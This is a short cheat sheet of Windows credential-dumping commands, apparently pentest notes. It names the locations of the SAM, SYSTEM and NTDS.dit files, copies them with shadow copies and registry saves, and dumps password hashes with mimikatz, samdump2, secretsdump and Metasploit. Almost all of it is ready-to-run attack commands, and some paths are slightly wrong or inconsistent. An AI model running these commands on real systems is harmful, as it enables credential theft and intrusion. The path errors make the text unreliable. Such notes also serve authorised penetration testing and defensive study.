## Extract Hashes

## Files Location

```
%SystemRoot%\System32\config\SAM # SAM File
%SystemRoot%\System32\config\SYSTEM # SYSTEM File
%SystemRoot%\Windows\NTDS\NTDS.dit # NTDS File
```

## Obtaining Files
### Shadow Copy
```
vssadmin create shadow /for=C:
copy \\?GLOBALROOT\Device\Harddisk\VolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\
vssadmin delete shadow /for=C:
```
### Regedit
```
reg save HKLM\SYSTEM C:\system.hiv
reg save HKLM\SAM C:\sam.hiv
```

## Dumping Hashes

### Mimikatz
Online
```
privilege::debug
token::elevate
lsadump::sam
```
Offline
```
lsadump::sam /system:<system_file> /sam:<sam_file>
```

### Samdump2
```
samdump2 <system_file> <sam_file>
```

### Secretsdump
```
secretsdump.py -ntds <NTDS file> -system <SYSTEM file> -hashes lmhash:nthash LOCAL -outputfile <file>
```

### Metasploit
```
hashdump # on meterpreter session
use post/windows/gather/hashdump
```
